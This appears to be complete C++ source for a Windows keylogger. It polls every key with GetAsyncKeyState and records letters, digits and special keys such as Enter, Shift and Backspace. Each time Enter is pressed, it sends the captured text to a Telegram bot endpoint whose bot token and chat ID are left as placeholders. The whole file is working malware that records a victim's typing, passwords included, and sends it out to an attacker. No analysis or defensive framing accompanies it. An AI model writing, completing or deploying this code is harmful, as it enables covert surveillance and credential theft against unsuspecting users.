#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <curl/curl.h>
#include <conio.h>

std::string message;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
	return size * nmemb;
}

void sendMessage(const std::string& message)
{
	std::string url = "https://api.telegram.org/botBOT_API/sendMessage"; //Bot API
	std::string data = "chat_id=CHAT_ID&text=" + message; //Chat ID

	CURL* curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

		CURLcode res = curl_easy_perform(curl);

		curl_easy_cleanup(curl);
	}
}

bool SpecialKeys(int S_Key)
{
	switch (S_Key)
	{
	case VK_SPACE:
		message += " ";
		return true;
	case VK_RETURN:
		message += "[ENTER]";
		return true;
	case '¾':
		message += ".";
		return true;
	case VK_SHIFT:
		message += "[SHIFT]";
		return true;
	case VK_BACK:
		message += "[BACKSPACE]";
		return true;
	case VK_RBUTTON:
		message += "[R_CLICK]";
		return true;
	case VK_CAPITAL:
		message += "[CAPS_LOCK]";
		return true;
	case VK_TAB:
		message += "[TAB]";
		return true;
	case VK_UP:
		message += "[UP]";
		return true;
	case VK_DOWN:
		message += "[DOWN]";
		return true;
	case VK_LEFT:
		message += "[LEFT]";
		return true;
	case VK_RIGHT:
		message += "[RIGHT]";
		return true;
	case VK_CONTROL:
		message += "[CONTROL]";
		return true;
	case VK_MENU:
		message += "[ALT]";
		return true;
	case 0xBE:
		message += ".";
		return true;
	case 0xBC:
		message += ",";
		return true;
	default:
		return false;
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char KEY = 'x';

	while (true)
	{
		Sleep(10);

		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767)
			{
				if (SpecialKeys(KEY) == false)
				{
					if ((KEY >= 'A' && KEY <= 'Z') || (KEY >= 'a' && KEY <= 'z'))
					{
						message += char(tolower(KEY));
					}
					else if (KEY >= '0' && KEY <= '9')
					{
						message += char(KEY);
					}
				}
				else
				{
					if (KEY == VK_RETURN)
					{
						sendMessage(message);
						message = "";

						Sleep(200);
					}
				}
			}
		}
	}

	return 0;
}